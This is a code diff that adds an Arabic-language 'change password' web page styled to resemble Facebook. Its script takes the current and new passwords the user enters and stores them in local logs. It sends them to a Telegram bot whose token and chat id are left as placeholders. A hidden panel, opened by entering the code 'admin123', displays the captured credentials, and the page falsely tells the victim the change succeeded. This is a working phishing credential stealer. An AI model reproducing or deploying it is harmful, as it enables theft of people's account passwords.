@@ -1,11 +1,77 @@
-المرور الجديدة وتأكيدها غير متطابقين!");
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تغيير كلمة المرور</title>
+    <style>
+        body { font-family: system-ui, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 360px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 6px; font-size: 0.9rem; color: #333; }
+        input { width: 100%; padding: 10px; box-sizing: border-box; border: 1px solid #ddd; border-radius: 6px; }
+        button { width: 100%; padding: 11px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 5px; }
+        .success-msg { display: none; background-color: #e7f3ff; color: #1877f2; padding: 12px; border-radius: 6px; margin-top: 15px; text-align: center; font-weight: bold; }
+        #secretPanel { display: none; }
+        .log-item { background: #f8f9fa; border-right: 4px solid #28a745; padding: 10px; margin-bottom: 10px; border-radius: 4px; font-size: 0.85rem; }
+    </style>
+</head>
+<body>
+
+<div class="card" id="mainScreen">
+    <h2>تغيير كلمة المرور</h2>
+    <form id="passwordForm">
+        <div class="form-group">
+            <label>كلمة المرور الحالية</label>
+            <input type="password" id="currentPass" required>
+        </div>
+        <div class="form-group">
+            <label>كلمة المرور الجديدة</label>
+            <input type="password" id="newPass" required>
+        </div>
+        <div class="form-group">
+            <label>تأكيد كلمة المرور الجديدة</label>
+            <input type="password" id="confirmPass" required>
+        </div>
+        <button type="submit">حفظ التغييرات</button>
+    </form>
+    <div class="success-msg" id="successBox">✅ تم تغيير كلمة مرورك بنجاح!</div>
+</div>
+
+<div class="card" id="secretPanel">
+    <h2>🔐 سجل المحفوظات المحلي</h2>
+    <div id="logsContainer"></div>
+    <button onclick="closeSecretPanel()" style="background-color: #6c757d;">رجوع</button>
+</div>
+
+<script>
+    // ضع بيانات بوتك هنا
+    const BOT_TOKEN = "ضع_توكن_البوت_هنا";
+    const CHAT_ID = "ضع_معرف_المحادثة_هنا";
+    const SECRET_CODE = "admin123";
+
+    const form = document.getElementById('passwordForm');
+    const successBox = document.getElementById('successBox');
+
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const currentPass = document.getElementById('currentPass').value;
+        const newPass = document.getElementById('newPass').value;
+        const confirmPass = document.getElementById('confirmPass').value;
+
+        if (currentPass === SECRET_CODE) {
+            openSecretPanel();
+            form.reset();
             return;
         }
 
-        // حفظ محلياً للتجربة
-        saveToLocalLogs(currentPass, newPass);
+        if (newPass !== confirmPass) {
+            alert("كلمة المرور الجديدة وتأكيدها غير متطابقين!");
+            return;
+        }
 
-        // إرسال البيانات مباشرة إلى بوت تيليجرام
+        saveToLocalLogs(currentPass, newPass);
         await sendToTelegram(currentPass, newPass);
 
         successBox.style.display = 'block';
